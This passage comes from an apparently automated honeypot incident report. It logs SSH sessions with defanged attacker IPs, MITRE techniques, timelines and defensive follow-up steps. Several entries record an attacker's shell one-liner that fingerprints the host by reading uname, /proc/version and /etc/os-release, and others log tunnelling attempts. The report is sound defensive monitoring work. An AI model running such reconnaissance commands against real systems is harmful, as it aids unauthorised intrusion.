| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:26` | `cowrie.log.closed` |
| `2026-07-28 12:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d73e87f848c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 12:57 |
| **Last Seen** | 2026-07-28 12:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 12:57:30` | `cowrie.session.connect` |
| `2026-07-28 12:57:31` | `cowrie.client.version` |
| `2026-07-28 12:57:31` | `cowrie.client.kex` |
| `2026-07-28 12:57:35` | `cowrie.login.success` |
| `2026-07-28 12:57:37` | `cowrie.session.params` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.success` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:37` | `cowrie.command.input` |
| `2026-07-28 12:57:38` | `cowrie.log.closed` |
| `2026-07-28 12:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f94bf5bf622

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 12:58 |
| **Last Seen** | 2026-07-28 12:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 12:58:43` | `cowrie.session.connect` |
| `2026-07-28 12:58:43` | `cowrie.client.version` |
| `2026-07-28 12:58:43` | `cowrie.client.kex` |
| `2026-07-28 12:58:47` | `cowrie.login.success` |
| `2026-07-28 12:58:49` | `cowrie.session.params` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.success` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:49` | `cowrie.command.input` |
| `2026-07-28 12:58:50` | `cowrie.log.closed` |
| `2026-07-28 12:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dbb4c1e0c20

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 12:58 |
| **Last Seen** | 2026-07-28 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 12:58:58` | `cowrie.session.connect` |
| `2026-07-28 12:58:58` | `cowrie.client.version` |
| `2026-07-28 12:58:58` | `cowrie.client.kex` |
| `2026-07-28 12:58:58` | `cowrie.login.success` |
| `2026-07-28 12:58:58` | `cowrie.direct-tcpip.request` |
| `2026-07-28 12:58:58` | `cowrie.direct-tcpip.data` |
| `2026-07-28 12:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b15c9506f7b6

| Field | Detail |
|---|---|
| **Source IP** | `117.50.218[.]37` |
| **First Seen** | 2026-07-28 12:59 |
| **Last Seen** | 2026-07-28 13:04 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 12:59:42` | `cowrie.session.connect` |
| `2026-07-28 12:59:42` | `cowrie.client.version` |
| `2026-07-28 12:59:42` | `cowrie.client.kex` |
| `2026-07-28 12:59:44` | `cowrie.login.success` |
| `2026-07-28 13:04:44` | `cowrie.session.file_upload` |
| `2026-07-28 13:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.218[.]37` to AbuseIPDB if not already reported
- [ ] Block `117.50.218[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22d0a1fc2c95

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 12:59 |
| **Last Seen** | 2026-07-28 13:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 12:59:54` | `cowrie.session.connect` |
| `2026-07-28 12:59:55` | `cowrie.client.version` |
| `2026-07-28 12:59:55` | `cowrie.client.kex` |
| `2026-07-28 12:59:59` | `cowrie.login.success` |
| `2026-07-28 13:00:01` | `cowrie.session.params` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.success` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:01` | `cowrie.command.input` |
| `2026-07-28 13:00:02` | `cowrie.log.closed` |
| `2026-07-28 13:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2633f7f7672c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:01 |
| **Last Seen** | 2026-07-28 13:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:01:07` | `cowrie.session.connect` |
| `2026-07-28 13:01:08` | `cowrie.client.version` |
| `2026-07-28 13:01:08` | `cowrie.client.kex` |
| `2026-07-28 13:01:11` | `cowrie.login.success` |
| `2026-07-28 13:01:13` | `cowrie.session.params` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.success` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:13` | `cowrie.command.input` |
| `2026-07-28 13:01:14` | `cowrie.log.closed` |
| `2026-07-28 13:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-272e66766cd0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:02 |
| **Last Seen** | 2026-07-28 13:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:02:22` | `cowrie.session.connect` |
| `2026-07-28 13:02:23` | `cowrie.client.version` |
| `2026-07-28 13:02:23` | `cowrie.client.kex` |
| `2026-07-28 13:02:26` | `cowrie.login.success` |
| `2026-07-28 13:02:28` | `cowrie.session.params` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.success` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:28` | `cowrie.command.input` |
| `2026-07-28 13:02:29` | `cowrie.log.closed` |
| `2026-07-28 13:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3656e590194a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:03 |
| **Last Seen** | 2026-07-28 13:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:03:34` | `cowrie.session.connect` |
| `2026-07-28 13:03:35` | `cowrie.client.version` |
| `2026-07-28 13:03:35` | `cowrie.client.kex` |
| `2026-07-28 13:03:39` | `cowrie.login.success` |
| `2026-07-28 13:03:41` | `cowrie.session.params` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.success` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:41` | `cowrie.command.input` |
| `2026-07-28 13:03:42` | `cowrie.log.closed` |
| `2026-07-28 13:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2080d4e26e6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:04 |
| **Last Seen** | 2026-07-28 13:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:04:47` | `cowrie.session.connect` |
| `2026-07-28 13:04:47` | `cowrie.client.version` |
| `2026-07-28 13:04:48` | `cowrie.client.kex` |
| `2026-07-28 13:04:51` | `cowrie.login.success` |
| `2026-07-28 13:04:53` | `cowrie.session.params` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.success` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:53` | `cowrie.command.input` |
| `2026-07-28 13:04:54` | `cowrie.log.closed` |
| `2026-07-28 13:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463e06cd28af

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-28 13:05 |
| **Last Seen** | 2026-07-28 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:05:06` | `cowrie.session.connect` |
| `2026-07-28 13:05:06` | `cowrie.client.version` |
| `2026-07-28 13:05:07` | `cowrie.client.kex` |
| `2026-07-28 13:05:07` | `cowrie.login.success` |
| `2026-07-28 13:05:07` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:05:07` | `cowrie.direct-tcpip.ja4` |
| `2026-07-28 13:05:07` | `cowrie.direct-tcpip.data` |
| `2026-07-28 13:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d75cc3b150b

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-07-28 13:05 |
| **Last Seen** | 2026-07-28 13:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:05:38` | `cowrie.session.connect` |
| `2026-07-28 13:05:40` | `cowrie.client.version` |
| `2026-07-28 13:05:40` | `cowrie.client.kex` |
| `2026-07-28 13:05:43` | `cowrie.login.success` |
| `2026-07-28 13:05:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:05:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5534c1cb491b

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-07-28 13:05 |
| **Last Seen** | 2026-07-28 13:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:05:49` | `cowrie.session.connect` |
| `2026-07-28 13:05:49` | `cowrie.client.version` |
| `2026-07-28 13:05:49` | `cowrie.client.kex` |
| `2026-07-28 13:05:51` | `cowrie.login.success` |
| `2026-07-28 13:05:51` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1654ef79be79

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:05 |
| **Last Seen** | 2026-07-28 13:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:05:59` | `cowrie.session.connect` |
| `2026-07-28 13:06:00` | `cowrie.client.version` |
| `2026-07-28 13:06:00` | `cowrie.client.kex` |
| `2026-07-28 13:06:04` | `cowrie.login.success` |
| `2026-07-28 13:06:06` | `cowrie.session.params` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.success` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:06` | `cowrie.command.input` |
| `2026-07-28 13:06:07` | `cowrie.log.closed` |
| `2026-07-28 13:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7faa8b6a3c87

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:07 |
| **Last Seen** | 2026-07-28 13:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:07:11` | `cowrie.session.connect` |
| `2026-07-28 13:07:12` | `cowrie.client.version` |
| `2026-07-28 13:07:12` | `cowrie.client.kex` |
| `2026-07-28 13:07:16` | `cowrie.login.success` |
| `2026-07-28 13:07:18` | `cowrie.session.params` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.success` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:18` | `cowrie.command.input` |
| `2026-07-28 13:07:19` | `cowrie.log.closed` |
| `2026-07-28 13:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c7e9ce2b84

| Field | Detail |
|---|---|
| **Source IP** | `122.117.30[.]20` |
| **First Seen** | 2026-07-28 13:07 |
| **Last Seen** | 2026-07-28 13:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:07:16` | `cowrie.session.connect` |
| `2026-07-28 13:07:18` | `cowrie.client.version` |
| `2026-07-28 13:07:18` | `cowrie.client.kex` |
| `2026-07-28 13:07:20` | `cowrie.login.success` |
| `2026-07-28 13:07:21` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.117.30[.]20` to AbuseIPDB if not already reported
- [ ] Block `122.117.30[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a6248603e78

| Field | Detail |
|---|---|
